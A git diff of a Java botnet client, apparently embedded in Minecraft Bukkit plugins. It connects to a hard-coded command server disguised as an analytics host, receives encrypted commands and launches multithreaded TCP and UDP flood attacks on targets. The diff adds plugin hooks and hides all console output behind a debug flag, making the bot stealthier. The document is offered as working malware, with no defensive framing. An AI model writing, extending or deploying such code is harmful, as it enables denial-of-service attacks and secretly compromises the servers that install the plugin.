@@ -4,6 +4,7 @@ import com.profesorfalken.jpowershell.OSDetector;
 import me.kutuzov.client.util.BukkitUtil;
 import me.kutuzov.packet.*;
 import me.pk2.moodlyencryption.MoodlyEncryption;
+import org.bukkit.plugin.Plugin;
 
 import javax.swing.*;
 import java.awt.*;
@@ -13,15 +14,23 @@ import java.io.ObjectOutputStream;
 import java.net.*;
 import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
+import java.util.Arrays;
 
 public class KutuzovEntry {
     public  static final String HOST = "analytics018.antecedentium.xyz";
     public  static final int    PORT = 33901;
-    public  static final String VERSION = "b201";
+    public  static final String VERSION = "b203";
+    public static boolean DEBUG = false;
+
+
+    private static Plugin plugin = null;
+    public static void setBukkitPlugin(Plugin plugin) { KutuzovEntry.plugin = plugin; }
+    public static Plugin getBukkitPlugin() { return plugin; }
 
     private static Socket socket;
     private static long lastPing = System.currentTimeMillis();
     public  static void main(String[] args) {
+        Arrays.stream(args).forEach(v -> { if(v.contentEquals("--debug")) DEBUG=true; });
         Thread thread = new Thread(()->{
             ObjectInputStream ois = null;
             ObjectOutputStream oos = null;
@@ -32,7 +41,8 @@ public class KutuzovEntry {
 
             while(true) {
                 if(System.currentTimeMillis() - lastPing > 10000) {
-                    System.out.println("[W0] Connection lost, reconnecting...");
+                    if(DEBUG)
+                        System.out.println("[W0] Connection lost, reconnecting...");
                     while (true) {
                         try {
                             Thread.sleep(100);
@@ -42,7 +52,8 @@ public class KutuzovEntry {
                             lastPing = System.currentTimeMillis();
                             break;
                         } catch (IOException | InterruptedException e1) {
-                            System.out.println("[W1] Connection lost, reconnecting...");
+                            if(DEBUG)
+                                System.out.println("[W1] Connection lost, reconnecting...");
                         }
                     }
                 }
@@ -63,7 +74,8 @@ public class KutuzovEntry {
                             MoodlyEncryption moodlyEncryption = new MoodlyEncryption();
                             moodlyEncryption.init(scDAPacket.data.substring(scDAPacket.data.length() - 16));
                             String decryptedData = moodlyEncryption.decrypt(scDAPacket.data.substring(0, scDAPacket.data.length() - 16).getBytes(StandardCharsets.UTF_8));
-                            System.out.println("[CLIENT(" + socket.getLocalPort() + ")]  SCDAPacket:" + decryptedData);
+                            if(DEBUG)
+                                System.out.println("[CLIENT(" + socket.getLocalPort() + ")]  SCDAPacket:" + decryptedData);
                             String[] data = decryptedData.split(";");
                             /* Actual data */
                             String method = data[0];
@@ -74,7 +86,8 @@ public class KutuzovEntry {
                             long until = System.currentTimeMillis() + time*60L;
                             switch (method) {
                                 case "tcp": {
-                                    System.out.println("TCP[" + socket.getLocalPort() + "]: " + data[1] + " -> " + data[2]);
+                                    if(DEBUG)
+                                        System.out.println("TCP[" + socket.getLocalPort() + "]: " + data[1] + " -> " + data[2]);
                                     for (int i = 0; i < threads; i++)
                                         new Thread(() -> {
                                             while(System.currentTimeMillis() < until) {
@@ -88,7 +101,8 @@ public class KutuzovEntry {
                                         }).start();
                                 } break;
                                 case "udp": {
-                                    System.out.println("UDP[" + socket.getLocalPort() + "]: " + data[1] + " -> " + data[2]);
+                                    if(DEBUG)
+                                        System.out.println("UDP[" + socket.getLocalPort() + "]: " + data[1] + " -> " + data[2]);
                                     for(int i = 0; i < threads; i++)
                                         new Thread(() -> {
                                             DatagramSocket socket = null;
